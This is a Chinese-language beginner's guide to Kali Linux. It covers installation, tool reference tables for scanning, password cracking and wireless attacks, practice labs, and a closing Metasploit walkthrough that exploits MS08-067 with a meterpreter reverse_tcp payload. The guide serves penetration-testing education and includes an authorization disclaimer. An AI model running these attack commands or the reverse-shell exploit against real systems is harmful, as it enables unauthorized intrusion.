# Kali Linux 入门完整指南

> 安全渗透测试环境搭建，常用工具速查，合法使用须知

## 目录

- [⚠️ 免责声明](#免责声明)
- [一、Kali Linux 简介](#kali-linux-简介)
  - [安装方式](#安装方式)
  - [虚拟机增强工具](#虚拟机增强工具)
- [二、更新与基础配置](#更新与基础配置)
- [三、Kali 工具分类速查](#kali-工具分类速查)
  - [信息收集](#信息收集)
  - [漏洞分析](#漏洞分析)
  - [密码攻击](#密码攻击)
  - [Web 渗透](#web-渗透)
  - [无线安全](#无线安全)
- [四、靶场推荐](#靶场推荐)
  - [本地靶场](#本地靶场)
  - [在线靶场](#在线靶场)
- [五、Kali 基本命令](#kali-基本命令)
- [六、Metasploit 框架](#metasploit-框架)

---


## ⚠️ 免责声明

**本文仅供学习网络安全原理和进行授权的安全测试使用。**
- 未经授权对他人系统进行渗透测试属于**违法犯罪行为**
- 所有测试必须在**自己拥有合法授权**的系统上进行
- 建议使用虚拟机搭建靶场环境，如 DVWA、Metasploitable、Vulnhub 靶机

---

## 一、Kali Linux 简介

Kali Linux 是基于 Debian 的专业渗透测试 Linux 发行版，预装了数百款安全工具，涵盖信息收集、漏洞分析、Web 渗透、密码攻击、无线攻击等多个领域。

### 安装方式

```bash
# 方式1：虚拟机（VirtualBox / VMware）
# 下载镜像：https://www.kali.org/get-kali/
# 安装 Kali Linux VM 镜像（预配置版，推荐新手）

# 方式2：WSL（Windows 子系统）
wsl --install -d kali-linux

# 方式3：Docker（快速尝鲜）
docker pull kalilinux/kali-rolling
docker run -it kalilinux/kali-rolling bash

# 方式4：双系统（不推荐新手）
```

### 虚拟机增强工具

```bash
# Kali 虚拟机中安装 VMware Tools / VirtualBox Guest Additions
sudo apt update
sudo apt install -y open-vm-tools-desktop   # VMware
# 或
sudo apt install -y virtualbox-guest-x11    # VirtualBox
```

---

## 二、更新与基础配置

```bash
# 更新系统
sudo apt update && sudo apt full-upgrade -y

# 安装基础工具
sudo apt install -y git curl wget vim nano htop net-tools dnsutils

# 安装 Python 和 pip
sudo apt install -y python3 python3-pip python3-venv

# 安装 Docker
curl -fsSL https://get.docker.com | sh
sudo systemctl enable docker

# 安装常用的安全工具（非预装）
sudo apt install -y nmap nikto dirb hydra john hashcat aircrack-ng
```

---

## 三、Kali 工具分类速查

### 信息收集

| 工具 | 用途 | 命令示例 |
|------|------|---------|
| Nmap | 端口扫描/主机发现 | `nmap -sV -sC target` |
| Maltego | 信息关联分析 | GUI 工具 |
| theHarvester | 邮箱/子域名收集 | `theHarvester -d target.com -b all` |
| Recon-ng | Web 侦察框架 | `recon-ng` |
| OSINT Framework | 开源情报收集 | Web 工具 |

### 漏洞分析

| 工具 | 用途 |
|------|------|
| OpenVAS | 漏洞扫描器 |
| Nikto | Web 服务器漏洞扫描 |
| sqlmap | SQL 注入检测与利用 |
| Burp Suite | Web 渗透测试代理 |

### 密码攻击

| 工具 | 用途 |
|------|------|
| John the Ripper | 密码哈希破解 |
| Hashcat | GPU 加速哈希破解 |
| Hydra | 在线暴力破解 |
| Medusa | 并行暴力破解 |

### Web 渗透

| 工具 | 用途 |
|------|------|
| Burp Suite | Web 代理/抓包/扫描 |
| sqlmap | SQL 注入自动化 |
| XSSer | XSS 漏洞检测 |
| OWASP ZAP | Web 漏洞扫描 |

### 无线安全

| 工具 | 用途 |
|------|------|
| Aircrack-ng | WiFi 密码破解 |
| Wifite | 自动化无线攻击 |
| Kismet | 无线网络检测器 |

---

## 四、靶场推荐

### 本地靶场

```bash
# DVWA（Web 漏洞靶场）
docker run -d -p 8080:80 vulnerables/web-dvwa

# Metasploitable2（综合漏洞靶机）
# 下载镜像：https://sourceforge.net/projects/metasploitable/
# 虚拟机中运行：用户名 msfadmin，密码 msfadmin

# Vulnhub（大量虚拟机靶机）
# https://www.vulnhub.com/
```

### 在线靶场

- **DVWA**：http://dvwa.co/
- **Hack The Box**：https://www.hackthebox.eu/
- **TryHackMe**：https://tryhackme.com/
- **PortSwigger Web Academy**：https://portswigger.net/web-security
- **PentesterLab**：https://pentesterlab.com/

---

## 五、Kali 基本命令

```bash
# 系统信息
uname -a
cat /etc/os-release
hostname -I

# 用户与权限
sudo su                    # 切换到 root
whoami                     # 当前用户

# 网络配置
ifconfig
iwconfig                   # 无线网卡
service apache2 start      # 启动 Apache

# 工具路径
which nmap
ls /usr/share/nmap/scripts/  # Nmap 脚本列表
```

---

## 六、Metasploit 框架

```bash
# 启动
msfconsole

# 基本流程
msf6 > search exploit_name      # 搜索漏洞/模块
msf6 > use exploit/path         # 使用模块
msf6 > show options             # 查看配置选项
msf6 > set RHOSTS target_ip    # 设置目标
msf6 > set PAYLOAD payload      # 设置载荷
msf6 > exploit                  # 执行

# 示例：利用 MS08-067
msf6 > search ms08-067
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 > set RHOSTS 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > exploit
```
